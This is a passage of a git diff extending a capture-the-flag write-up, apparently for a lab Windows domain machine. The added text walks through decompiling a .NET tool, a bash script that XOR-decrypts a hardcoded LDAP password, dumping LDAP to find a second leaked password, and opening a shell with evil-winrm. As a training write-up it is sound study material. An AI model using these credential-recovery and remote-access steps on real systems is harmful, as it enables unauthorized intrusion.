@@ -333,6 +333,71 @@ smb: \> ls
 smb: \> 
 ```
 
-- Let's check this userinfo file. If we look it up we find this [page](https://www.mkssoftware.com/docs/man1/userinfo.1.asp)
+- Let's check this userinfo file. It is the one file that stands out If we look it up we find this [page](https://www.mkssoftware.com/docs/man1/userinfo.1.asp)
 
-**Coming soon**
+- If we install [ILSpy](https://github.com/icsharpcode/AvaloniaILSpy/releases) (the one that works on Linux) we can decompile the code.
+- We have something interesting here the ldapQuery():  
+
+![ldapquery](../.res/2023-03-04-19-34-45.png)  
+
+For some reason ILSpy does not show the code but to be able to actually see the code we can just save it this way by right clicking on the function.  
+
+![save code](../.res/2023-03-04-19-37-13.png)
+
+Then we just need to open it with VSCodium.
+Once the code open we find this very interesting snippet:  
+
+![Userinfo Services](../.res/2023-03-04-19-41-15.png)
+
+Using the function we can make a bash script to get the plaintext value
+
+```bash
+#!/bin/bash
+
+enc_password="0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+key="armando"
+
+decrypt_password() {
+    enc_bytes=$(echo "$1" | base64 --decode)
+    plain_bytes=""
+    for ((i=0; i<${#enc_bytes}; i++)); do
+        plain_byte=$((($(printf '%d' "'${enc_bytes:$i:1}") ^ $(printf '%d' "'${key:$((i%${#key})):1}")) ^ 0xDF))
+        plain_bytes="${plain_bytes}$(printf '\\x%02x' $plain_byte)"
+    done
+    plain_password=$(echo -e "${plain_bytes}")
+    echo "$plain_password"
+}
+
+plain_password=$(decrypt_password "$enc_password" "$key")
+echo "$plain_password"
+```
+
+> The base64-encoded password is decoded to bytes using the "base64 --decode" command.  
+> Then, each byte of the encrypted password is decrypted using the encryption key and a XOR operation, the result is stored in a new byte array called "plain_bytes".
+> Finally we just print the plaintext password.
+
+- And it works we get the password
+
+![password](../.res/2023-03-04-19-53-12.png)  
+
+- Now that we have the password, we can query ldap and put the result in a file for further analysis `ldapsearch -x -b "dc=support,dc=htb" -H ldap://support.htb -D ldap@support.htb  -W > ldap.txt`  
+- Often when windows is misconfigured we could find password in the info field so lets grep on info and see if we find anything  
+- And it works we find a password this way.
+
+![grep info](../.res/2023-03-04-20-10-06.png)  
+
+- Now let's see more info related on this password by showing the previous lines and some lines after our grep.
+
+![info](../.res/2023-03-04-20-19-32.png)  
+
+- Now let's try to get a shell with evil-winrm using this info `evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb` it works we can get the user flag from the desktop  
+
+![evil-winrm](../.res/2023-03-04-20-51-18.png)
+
+## Privilege escalation
+
+- Let's first enumerate the domaine with `Get-ADDomain`  
+
+![Get-ADDomain](../.res/2023-03-04-20-57-25.png)  
+
+- We can add `dc.support.htb` in our host file
